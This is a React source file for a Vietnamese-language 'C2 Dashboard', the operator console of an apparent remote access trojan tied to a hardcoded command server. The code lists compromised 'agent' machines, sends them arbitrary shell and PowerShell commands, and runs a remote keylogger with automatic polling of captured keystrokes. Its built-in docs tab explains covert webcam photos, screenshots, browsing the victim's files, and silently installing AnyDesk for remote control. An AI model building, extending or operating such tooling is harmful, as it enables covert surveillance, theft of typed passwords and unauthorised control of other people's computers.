import { useState, useEffect, useCallback, useRef } from 'react';
import axios from 'axios';
import './App.css';

const API = 'https://c2.fastvault.net';

function App() {
  const [token, setToken] = useState(localStorage.getItem('c2_token') || '');
  const [tab, setTab] = useState('devices');
  const [stats, setStats] = useState(null);
  const [devices, setDevices] = useState([]);
  const [commands, setCommands] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState('');
  const [cmdText, setCmdText] = useState('');
  const [cmdResult, setCmdResult] = useState('');
  const [loginErr, setLoginErr] = useState('');
  const [user, setUser] = useState(null);
  const [fullOutput, setFullOutput] = useState(null);
  const [logs, setLogs] = useState([]);
  const [logLevel, setLogLevel] = useState('');
  const [logDevice, setLogDevice] = useState('');
  const [keylogDevice, setKeylogDevice] = useState('');
  const [keylogData, setKeylogData] = useState('');
  const [keylogStatus, setKeylogStatus] = useState('');
  const [keylogAuto, setKeylogAuto] = useState(false);
  const keylogIntervalRef = useRef(null);

  const api = useCallback(() => axios.create({
    baseURL: API,
    headers: token ? { Authorization: `Bearer ${token}` } : {},
  }), [token]);

  const fetchStats = useCallback(async () => {
    try { const r = await api().get('/api/stats'); setStats(r.data); } catch (e) {}
  }, [api]);

  const fetchDevices = useCallback(async () => {
    try { const r = await api().get('/api/devices'); setDevices(r.data); } catch (e) {}
  }, [api]);

  const fetchCommands = useCallback(async () => {
    try {
      const params = selectedDevice ? { device_id: selectedDevice } : {};
      const r = await api().get('/api/commands', { params });
      setCommands(r.data);
    } catch (e) {}
  }, [api, selectedDevice]);

  const fetchLogs = useCallback(async () => {
    try {
      const params = {};
      if (logDevice) params.device_id = logDevice;
      if (logLevel) params.level = logLevel;
      const r = await api().get('/api/logs', { params });
      setLogs(r.data);
    } catch (e) {}
  }, [api, logDevice, logLevel]);

  useEffect(() => {
    if (!token) return;
    fetchStats(); fetchDevices(); fetchCommands(); fetchLogs();
    const iv = setInterval(() => { fetchStats(); fetchDevices(); fetchCommands(); fetchLogs(); }, 5000);
    return () => clearInterval(iv);
  }, [token, fetchStats, fetchDevices, fetchCommands, fetchLogs]);

  // Auto scroll logs xuong cuoi
  useEffect(() => {
    const el = document.getElementById('log-list');
    if (el) el.scrollTop = el.scrollHeight;
  }, [logs]);

  // Auto keylog polling
  useEffect(() => {
    if (!keylogAuto || !keylogDevice) return;
    const poll = async () => {
      try {
        await api().post('/api/commands', null, { params: { device_id: keylogDevice, command: 'keylog_get' } });
        // Cho 2s de agent xu ly
        setTimeout(async () => {
          try {
            const r = await api().get('/api/commands', { params: { device_id: keylogDevice, limit: 1 } });
            const last = r.data[0];
            if (last && last.command_text === 'keylog_get' && last.output && last.output !== '[KEYLOG] Chua co du lieu') {
              let txt = last.output.replace('[KEYLOG] Du lieu ghi nhan:\n', '');
              setKeylogData(prev => (prev || '') + txt);
              // Auto scroll xuong
              const el = document.getElementById('keylog-display');
              if (el) el.scrollTop = el.scrollHeight;
            }
          } catch(e) {}
        }, 2500);
      } catch(e) {}
    };
    poll();
    const iv = setInterval(poll, 4000);
    return () => clearInterval(iv);
  }, [keylogAuto, keylogDevice, api]);

  const login = async (e) => {
    e.preventDefault();
    const fd = new FormData(e.target);
    try {
      const r = await axios.post(`${API}/auth/login`, {
        username: fd.get('username'),
        password: fd.get('password'),
      });
      const t = r.data.access_token;
      setToken(t);
      setUser({ username: r.data.username, role: r.data.role });
      localStorage.setItem('c2_token', t);
      setLoginErr('');
    } catch (err) {
      setLoginErr('Sai tai khoan hoac mat khau');
    }
  };

  const sendCommand = async () => {
    if (!selectedDevice || !cmdText) return;
    try {
      const r = await api().post('/api/commands', null, {
        params: { device_id: selectedDevice, command: cmdText }
      });
      setCmdResult(`✅ Da gui: ${r.data.command_id}`);
      setCmdText('');
      setTimeout(fetchCommands, 1000);
    } catch (e) {
      setCmdResult('❌ Loi: ' + (e.response?.data?.detail || e.message));
    }
  };

  const logout = () => {
    localStorage.removeItem('c2_token');
    setToken(''); setUser(null);
  };

  const deleteDevice = async (deviceId) => {
    if (!window.confirm(`Xoa thiet bi ${deviceId}?`)) return;
    try {
      await api().delete(`/api/devices/${deviceId}`);
      fetchDevices(); fetchStats();
    } catch (e) { alert('Loi xoa: ' + (e.response?.data?.detail || e.message)); }
  };

  if (!token) {
    return (
      <div className="login-page">
        <div className="login-box">
          <h1>🛡️ C2 Dashboard</h1>
          <form onSubmit={login}>
            <input name="username" placeholder="Username" defaultValue="admin" required />
            <input name="password" type="password" placeholder="Password" required />
            <button type="submit">Dang nhap</button>
          </form>
          {loginErr && <p className="err">{loginErr}</p>}
        </div>
      </div>
    );
  }

  return (
    <div className="app">
      <header>
        <h1>🛡️ C2 Dashboard</h1>
        <nav>
          <button className={tab === 'devices' ? 'active' : ''} onClick={() => setTab('devices')}>📡 Thiet bi</button>
          <button className={tab === 'commands' ? 'active' : ''} onClick={() => setTab('commands')}>💻 Lenh</button>
          <button className={tab === 'keylog' ? 'active' : ''} onClick={() => setTab('keylog')}>⌨️ Keylog</button>
          <button className={tab === 'logs' ? 'active' : ''} onClick={() => setTab('logs')}>📋 Logs</button>
          <button className={tab === 'docs' ? 'active' : ''} onClick={() => setTab('docs')}>📖 Docs</button>
          <button className={tab === 'alerts' ? 'active' : ''} onClick={() => setTab('alerts')}>🔔 Canh bao</button>
        </nav>
        <div className="user-info">
          <span>{user?.username} ({user?.role})</span>
          <button onClick={logout} className="btn-logout">Dang xuat</button>
        </div>
      </header>

      {stats && (
        <div className="stats-bar">
          <div className="stat online"><span>{stats.devices_online}</span> Online</div>
          <div className="stat total"><span>{stats.devices_total}</span> Total</div>
          <div className="stat pending"><span>{stats.pending_commands}</span> Pending</div>
          <div className="stat alerts"><span>{stats.unread_alerts}</span> Alerts</div>
        </div>
      )}

      {tab === 'devices' && (
        <div className="panel">
          <h2>Danh sach thiet bi</h2>
          <table>
            <thead>
              <tr>
                <th>Device ID</th><th>Hostname</th><th>IP</th><th>OS</th><th>CPU</th><th>RAM</th><th>Status</th><th>Last Seen</th><th>Action</th>
              </tr>
            </thead>
            <tbody>
              {devices.map(d => {
                let meta = {};
                try { meta = typeof d.metadata === 'string' ? JSON.parse(d.metadata) : (d.metadata || {}); } catch (e) {}
                return (
                  <tr key={d.device_id} className={d.status === 'online' ? 'row-online' : 'row-offline'}>
                    <td><code>{d.device_id}</code></td>
                    <td>{d.hostname}</td>
                    <td>{d.ip_address}</td>
                    <td>{d.os_name} {d.os_version?.slice(0,15)}</td>
                    <td>{meta.cpu_percent ?? '?'}%</td>
                    <td>{meta.ram_percent ?? '?'}%</td>
                    <td><span className={`badge ${d.status}`}>{d.status}</span></td>
                    <td>{new Date(d.last_seen).toLocaleTimeString()}</td>
                    <td>
                      <button onClick={() => { setSelectedDevice(d.device_id); setTab('commands'); }}>💻</button>
                      <button onClick={() => deleteDevice(d.device_id)} style={{background:'#da3633',marginLeft:4}}>🗑️</button>
                    </td>
                  </tr>
                );
              })}
              {devices.length === 0 && <tr><td colSpan="9" className="empty">No devices connected</td></tr>}
            </tbody>
          </table>
        </div>
      )}

      {tab === 'commands' && (
        <div className="panel">
          <h2>Gui lenh</h2>
          <div className="cmd-send">
            <select value={selectedDevice} onChange={e => setSelectedDevice(e.target.value)}>
              <option value="">-- Chon thiet bi --</option>
              {devices.filter(d => d.status === 'online').map(d => (
                <option key={d.device_id} value={d.device_id}>{d.hostname} ({d.device_id})</option>
              ))}
            </select>
            <input
              value={cmdText}
              onChange={e => setCmdText(e.target.value)}
              onKeyDown={e => e.key === 'Enter' && sendCommand()}
              placeholder="ipconfig / whoami / dir / tasklist..."
            />
            <button onClick={sendCommand} disabled={!selectedDevice || !cmdText}>🚀 Send</button>
          </div>
          {cmdResult && <p className="cmd-result">{cmdResult}</p>}

          <h2>Lich su lenh</h2>
          <table>
            <thead>
              <tr><th>ID</th><th>Device</th><th>Command</th><th>Status</th><th>Output</th><th>Exit</th><th>Time</th></tr>
            </thead>
            <tbody>
              {commands.map(c => (
                <tr key={c.command_id}>
                  <td>{c.command_id}</td>
                  <td><code>{c.device_id?.slice(-12)}</code></td>
                  <td className="cmd-cell">{c.command_text}</td>
                  <td><span className={`badge ${c.status}`}>{c.status}</span></td>
                  <td className="output-cell" onClick={() => setFullOutput(c.output)} title="Click de xem full">
                    {c.output?.indexOf('[IMG]') !== -1 ? (
                      <span className="webcam-thumb" onClick={e => { e.stopPropagation(); setFullOutput(c.output); }}>
                        📸 View Photo
                      </span>
                    ) : (
                      <>{c.output?.slice(0, 60)}{c.output?.length > 60 ? '...' : ''}</>
                    )}
                  </td>
                  <td>{c.exit_code !== null ? c.exit_code : '-'}</td>
                  <td>{new Date(c.created_at).toLocaleTimeString()}</td>
                </tr>
              ))}
              {commands.length === 0 && <tr><td colSpan="7" className="empty">No commands yet</td></tr>}
            </tbody>
          </table>
        </div>
      )}

      {tab === 'keylog' && (
        <div className="panel">
          <h2>⌨️ Keylogger</h2>
          <div className="keylog-toolbar">
            <select value={keylogDevice} onChange={async e => {
              const dev = e.target.value;
              setKeylogDevice(dev);
              if (dev) {
                setKeylogData('');
                setKeylogStatus('🟢 Tu dong ghi...');
                await api().post('/api/commands', null, { params: { device_id: dev, command: 'keylog_start' } });
                setKeylogAuto(true);
              } else {
                setKeylogAuto(false);
              }
            }}>
              <option value="">-- Chon thiet bi --</option>
              {devices.filter(d => d.status === 'online').map(d => (
                <option key={d.device_id} value={d.device_id}>{d.hostname} ({d.device_id.slice(-8)})</option>
              ))}
            </select>
            <button className="btn-keylog-stop" onClick={async () => {
              setKeylogAuto(false);
              if (keylogDevice) {
                await api().post('/api/commands', null, { params: { device_id: keylogDevice, command: 'keylog_stop' } });
              }
              setKeylogStatus('⏹️ Da dung');
            }} disabled={!keylogDevice}>⏹️ Stop</button>
          </div>
          <div className="keylog-status">{keylogStatus}</div>
          <div className="keylog-output">
            <pre id="keylog-display">{keylogData || 'Chon thiet bi -> tu dong ghi phim...'}</pre>
            <button className="btn-clear" onClick={() => { setKeylogData(''); }}>🗑️ Xoa</button>
          </div>
        </div>
      )}

      {tab === 'logs' && (
        <div className="panel">
          <h2>📋 Nhat ky thiet bi</h2>
          <div className="log-filter">
            <select value={logDevice} onChange={e => setLogDevice(e.target.value)}>
              <option value="">-- Tat ca thiet bi --</option>
              {devices.map(d => (
                <option key={d.device_id} value={d.device_id}>{d.hostname} ({d.device_id.slice(-8)})</option>
              ))}
            </select>
            <select value={logLevel} onChange={e => setLogLevel(e.target.value)}>
              <option value="">Tat ca level</option>
              <option value="DEBUG">DEBUG</option>
              <option value="INFO">INFO</option>
              <option value="WARN">WARN</option>
              <option value="ERROR">ERROR</option>
              <option value="CRITICAL">CRITICAL</option>
            </select>
          </div>
          <div id="log-list" className="log-list">
            {logs.length === 0 ? (
              <p className="empty">Khong co log nao</p>
            ) : (
              logs.map(log => (
                <div key={log.log_id} className={`log-entry log-${(log.level || 'info').toLowerCase()}`}>
                  <span className="log-time">{new Date(log.created_at).toLocaleTimeString()}</span>
                  <span className={`log-badge ${(log.level || 'info').toLowerCase()}`}>{log.level}</span>
                  <span className="log-device"><code>{log.device_id?.slice(-12)}</code></span>
                  <span className="log-source">[{log.source}]</span>
                  <span className="log-msg">{log.message}</span>
                </div>
              ))
            )}
          </div>
        </div>
      )}

      {tab === 'docs' && (
        <div className="panel">
          <h2>📖 Huong dan su dung</h2>

          <div className="docs-section">
            <h3>📡 Thiet bi</h3>
            <p>Danh sach cac may da ket noi. Online = xanh, Offline = xam.</p>
            <ul>
              <li>💻 <b>Chon may</b> → chuyen sang tab Lenh de gui lenh</li>
              <li>🗑️ <b>Xoa may</b> → xoa khoi danh sach</li>
            </ul>
          </div>

          <div className="docs-section">
            <h3>💻 Lenh shell</h3>
            <p>Gui lenh CMD / PowerShell bat ky toi may da chon:</p>
            <div className="docs-table">
              <div className="docs-row"><code>ipconfig /all</code><span>Xem IP, DNS, Gateway</span></div>
              <div className="docs-row"><code>whoami</code><span>Ten nguoi dung hien tai</span></div>
              <div className="docs-row"><code>systeminfo</code><span>Thong tin he thong</span></div>
              <div className="docs-row"><code>tasklist</code><span>Danh sach tien trinh</span></div>
              <div className="docs-row"><code>netstat -an</code><span>Cac cong dang mo</span></div>
              <div className="docs-row"><code>dir C:\</code><span>Xem thu muc C:</span></div>
              <div className="docs-row"><code>powershell -Command \"...\"</code><span>Lenh PowerShell</span></div>
            </div>
          </div>

          <div className="docs-section">
            <h3>⌨️ Keylogger</h3>
            <p>Ghi lai phim go tu xa. Mo tab <b>⌨️ Keylog</b>, chon may -> tu dong ghi.</p>
            <div className="docs-table">
              <div className="docs-row"><code>keylog_start</code><span>Bat dau ghi phim</span></div>
              <div className="docs-row"><code>keylog_get</code><span>Lay du lieu phim da go</span></div>
              <div className="docs-row"><code>keylog_stop</code><span>Dung ghi phim</span></div>
            </div>
          </div>

          <div className="docs-section">
            <h3>📸 Webcam</h3>
            <p>Gui lenh <code>webcam</code> → agent tu dong cai opencv + chup webcam → gui anh ve Dashboard.</p>
          </div>

          <div className="docs-section">
            <h3>🖥️ Screenshot</h3>
            <p>Gui lenh <code>screen</code> → chup man hinh may do → gui anh ve Dashboard.</p>
          </div>

          <div className="docs-section">
            <h3>📁 File Browser</h3>
            <p>Xem danh sach file/thu muc tren may kia:</p>
            <div className="docs-table">
              <div className="docs-row"><code>ls D:\</code><span>Xem thu muc D:</span></div>
              <div className="docs-row"><code>ls C:\Users</code><span>Xem thu muc Users</span></div>
              <div className="docs-row"><code>ls D:\file.txt</code><span>Xem thong tin 1 file</span></div>
            </div>
          </div>

          <div className="docs-section">
            <h3>🖱️ Remote Desktop</h3>
            <p>Gui lenh <code>rd</code> → agent tu dong tai AnyDesk + chay + tra ve ID → ban nhap ID AnyDesk de remote.</p>
          </div>

          <div className="docs-section">
            <h3>📋 Logs</h3>
            <p>Tab <b>📋 Logs</b> hien thi nhat ky hoat dong cua cac may. Loc theo may hoac level (INFO, WARN, ERROR).</p>
          </div>

          <div className="docs-section">
            <h3>🔔 Canh bao</h3>
            <p>Hien thi canh bao khi may offline, CPU/RAM cao, hoac lenh that bai.</p>
          </div>

          <div className="docs-section">
            <h3>🏗️ Kien truc he thong</h3>
            <div className="docs-diagram">
              <pre>{`
  Dashboard (may ban) ──https──┐
                               V
  C2 Server (VPS) ── PostgreSQL + Redis
      │
      ├── Agent May A (exe)
      ├── Agent May B (exe)
      └── Agent May C (exe)
              `}</pre>
            </div>
          </div>
        </div>
      )}

      {tab === 'alerts' && (
        <div className="panel">
          <h2>Canh bao</h2>
          <p className="empty">No alerts. Everything is running smoothly.</p>
        </div>
      )}

      {/* Full Output Modal */}
      {fullOutput !== null && (
        <div className="output-overlay" onClick={() => setFullOutput(null)}>
          <div className="output-modal" onClick={e => e.stopPropagation()}>
            <div className="output-modal-header">
              <span>📄 Output</span>
              <button onClick={() => setFullOutput(null)}>✕</button>
            </div>
            <div className="output-modal-body">
              {fullOutput && (() => {
                const imgMatch = fullOutput.match(/\[IMG\](.*?)\[\/IMG\]/);
                if (imgMatch) {
                  const b64 = imgMatch[1];
                  const text = fullOutput.replace(/\[IMG\].*?\[\/IMG\]/, '').trim();
                  return (
                    <>
                      <div className="webcam-container">
                        <img src={`data:image/jpeg;base64,${b64}`} alt="Webcam" className="webcam-img" />
                      </div>
                      <pre>{text || '(no additional output)'}</pre>
                    </>
                  );
                }
                return <pre>{fullOutput}</pre>;
              })()}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;
